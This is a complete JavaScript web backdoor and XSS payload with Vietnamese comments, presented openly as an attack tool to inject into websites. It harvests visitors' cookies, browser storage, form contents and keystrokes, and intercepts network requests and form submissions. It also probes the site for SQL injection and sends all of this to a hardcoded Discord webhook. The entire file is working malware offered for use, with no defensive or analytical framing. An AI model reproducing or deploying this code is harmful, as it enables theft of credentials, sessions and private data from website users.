/**
 * Web Backdoor + XSS Payload hoàn chỉnh.
 * Chức năng: Inject vào website, thu thập form, cookie, localStorage,
 *            sessionStorage, keylog, DOM, screenshot, SQLi, và exfil về Discord.
 * Cách dùng: Chèn đoạn <script src="payload.js"></script> vào website,
 *            hoặc upload payload.js lên server qua lỗ hổng upload.
 */

(function() {
  'use strict';

  // ============ CẤU HÌNH ============
  const WEBHOOK = 'https://discord.com/api/webhooks/1559071638442479727/a52oLmvAKls6sF7QZqonSrNEXAdvljPi85OcKlQsncRFB1hsmyWK3rqHvmOPYQuoamL6'; // Thay webhook thật
  const INTERVAL = 30000;   // 30s gửi 1 lần
  const KEYLOG_INTERVAL = 15000;

  // ============ HÀM GỬI DISCORD ============
  function send(data, label) {
    try {
      const payload = {
        username: 'WebHarvester',
        content: `**${label}**\n\`\`\`json\n${JSON.stringify(data, null, 2).substring(0, 1900)}\n\`\`\``
      };
      // Dùng fetch ưu tiên, fallback Image beacon nếu CORS chặn
      fetch(WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        mode: 'no-cors'
      }).catch(() => {
        const img = new Image();
        img.src = WEBHOOK + '?content=' + encodeURIComponent(payload.content);
      });
    } catch (e) {}
  }

  // ============ THU THẬP THÔNG TIN CƠ BẢN ============
  function collectBasic() {
    return {
      url: location.href,
      referrer: document.referrer,
      title: document.title,
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      languages: navigator.languages,
      cookieEnabled: navigator.cookieEnabled,
      online: navigator.onLine,
      screen: {
        width: screen.width,
        height: screen.height,
        colorDepth: screen.colorDepth,
        pixelRatio: window.devicePixelRatio
      },
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timestamp: new Date().toISOString()
    };
  }

  // ============ THU THẬP COOKIE ============
  function collectCookies() {
    const cookies = {};
    document.cookie.split(';').forEach(c => {
      const [k, v] = c.trim().split('=');
      if (k) cookies[k] = decodeURIComponent(v || '');
    });
    return cookies;
  }

  // ============ THU THẬP STORAGE ============
  function collectStorage() {
    const ls = {}, ss = {};
    try {
      for (let i = 0; i < localStorage.length; i++) {
        const k = localStorage.key(i);
        ls[k] = localStorage.getItem(k);
      }
    } catch (e) {}
    try {
      for (let i = 0; i < sessionStorage.length; i++) {
        const k = sessionStorage.key(i);
        ss[k] = sessionStorage.getItem(k);
      }
    } catch (e) {}
    return { localStorage: ls, sessionStorage: ss };
  }

  // ============ THU THẬP FORM + INPUT ============
  function collectForms() {
    const forms = [];
    document.querySelectorAll('form').forEach((f, idx) => {
      const inputs = [];
      f.querySelectorAll('input, textarea, select').forEach(inp => {
        inputs.push({
          name: inp.name || '',
          type: inp.type || inp.tagName.toLowerCase(),
          id: inp.id || '',
          placeholder: inp.placeholder || '',
          value: inp.value || '',
          autocomplete: inp.autocomplete || ''
        });
      });
      forms.push({
        index: idx,
        action: f.action || location.href,
        method: (f.method || 'GET').toUpperCase(),
        id: f.id || '',
        inputs: inputs
      });
    });
    return forms;
  }

  // ============ THU THẬP LINK + DOM ============
  function collectLinks() {
    const links = [];
    document.querySelectorAll('a[href]').forEach(a => {
      links.push({ href: a.href, text: (a.innerText || '').trim().substring(0, 100) });
    });
    return links.slice(0, 100);
  }

  function collectDOM() {
    return {
      html: document.documentElement.outerHTML.substring(0, 5000),
      scripts: Array.from(document.scripts).map(s => s.src || '(inline)').slice(0, 30),
      meta: Array.from(document.querySelectorAll('meta')).map(m => ({
        name: m.name || m.getAttribute('property') || '',
        content: m.content || ''
      }))
    };
  }

  // ============ KEYLOGGER TRÊN TRANG ============
  const keylog = [];
  function initKeylogger() {
    document.addEventListener('keydown', e => {
      keylog.push({
        key: e.key,
        code: e.code,
        time: Date.now(),
        target: e.target.tagName + (e.target.id ? '#' + e.target.id : '') + (e.target.name ? '[name=' + e.target.name + ']' : '')
      });
    });
    document.addEventListener('input', e => {
      if (e.target && (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA')) {
        keylog.push({
          type: 'input',
          name: e.target.name || e.target.id || '',
          value: e.target.value,
          time: Date.now()
        });
      }
    });
    setInterval(() => {
      if (keylog.length === 0) return;
      const batch = keylog.splice(0, keylog.length);
      send(batch, '⌨️ Keylog / Input');
    }, KEYLOG_INTERVAL);
  }

  // ============ CHỤP MÀN HÌNH QUA HTML2CANVAS ============
  function captureScreenshot() {
    // Dùng thư viện html2canvas nếu có sẵn, ngược lại bỏ qua
    if (typeof html2canvas === 'undefined') return;
    html2canvas(document.body, { useCORS: true }).then(canvas => {
      const data = canvas.toDataURL('image/png').substring(0, 1900);
      send({ screenshot_base64: data }, '🖥️ Screenshot (base64)');
    }).catch(() => {});
  }

  // ============ SQL INJECTION SCANNER ============
  async function scanSQLi() {
    const payloads = ["'", "\"", "1' OR '1'='1", "' UNION SELECT NULL--", "' OR 1=1--"];
    const params = new URLSearchParams(location.search);
    const found = [];
    for (const [key] of params) {
      for (const p of payloads) {
        const testUrl = location.origin + location.pathname + '?' + key + '=' + encodeURIComponent(p);
        try {
          const res = await fetch(testUrl);
          const text = await res.text();
          if (/SQL syntax|mysql_|ORA-|PostgreSQL|SQLite|Unclosed quotation/i.test(text)) {
            found.push({ param: key, payload: p, url: testUrl });
          }
        } catch (e) {}
      }
    }
    if (found.length) send(found, '⚠️ SQLi detected');
  }

  // ============ SCAN LINK NỘI BỘ ============
  async function scanInternalLinks() {
    const links = collectLinks().map(l => l.href).filter(h => h.startsWith(location.origin));
    const unique = [...new Set(links)].slice(0, 20);
    const results = [];
    for (const url of unique) {
      try {
        const res = await fetch(url);
        const text = await res.text();
        results.push({
          url: url,
          status: res.status,
          length: text.length,
          hasForm: /<form/i.test(text),
          hasPassword: /type=["']password/i.test(text),
          hasToken: /csrf|token/i.test(text)
        });
      } catch (e) {}
    }
    if (results.length) send(results, '🔗 Internal links scan');
  }

  // ============ HOOK FETCH + XHR ============
  function hookNetwork() {
    const origFetch = window.fetch;
    window.fetch = function(...args) {
      const url = args[0];
      const opts = args[1] || {};
      try {
        if (opts.body) {
          send({ type: 'fetch', url: String(url), body: String(opts.body).substring(0, 500) }, '📡 Network Hook');
        }
      } catch (e) {}
      return origFetch.apply(this, args);
    };

    const origOpen = XMLHttpRequest.prototype.open;
    const origSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.open = function(method, url) {
      this._url = url;
      this._method = method;
      return origOpen.apply(this, arguments);
    };
    XMLHttpRequest.prototype.send = function(body) {
      try {
        if (body) send({ type: 'xhr', url: this._url, method: this._method, body: String(body).substring(0, 500) }, '📡 XHR Hook');
      } catch (e) {}
      return origSend.apply(this, arguments);
    };
  }

  // ============ HOOK FORM SUBMIT ============
  function hookForms() {
    document.addEventListener('submit', e => {
      const f = e.target;
      const data = {};
      new FormData(f).forEach((v, k) => data[k] = v);
      send({ action: f.action, method: f.method, data }, '📝 Form Submit');
    }, true);
  }

  // ============ PERSISTENCE QUA SERVICE WORKER ============
  function installPersistence() {
    if ('serviceWorker' in navigator) {
      const swCode = `
        self.addEventListener('fetch', e => {
          e.respondWith(fetch(e.request).catch(() => caches.match(e.request)));
        });
        self.addEventListener('install', e => self.skipWaiting());
        self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));
      `;
      const blob = new Blob([swCode], { type: 'application/javascript' });
      const url = URL.createObjectURL(blob);
      navigator.serviceWorker.register(url).catch(() => {});
    }
  }

  // ============ MAIN ============
  function main() {
    // Gửi dữ liệu ban đầu
    send({
      basic: collectBasic(),
      cookies: collectCookies(),
      storage: collectStorage(),
      forms: collectForms(),
      dom: collectDOM(),
      links: collectLinks()
    }, '🟢 Initial Harvest');

    // Khởi động các module
    initKeylogger();
    hookNetwork();
    hookForms();
    installPersistence();

    // Định kỳ
    setInterval(() => {
      send({
        basic: collectBasic(),
        cookies: collectCookies(),
        storage: collectStorage()
      }, '🔄 Periodic Harvest');
    }, INTERVAL);

    // Chạy 1 lần sau 5s
    setTimeout(() => {
      scanSQLi();
      scanInternalLinks();
      captureScreenshot();
    }, 5000);
  }

  // Chờ DOM ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', main);
  } else {
    main();
  }
})();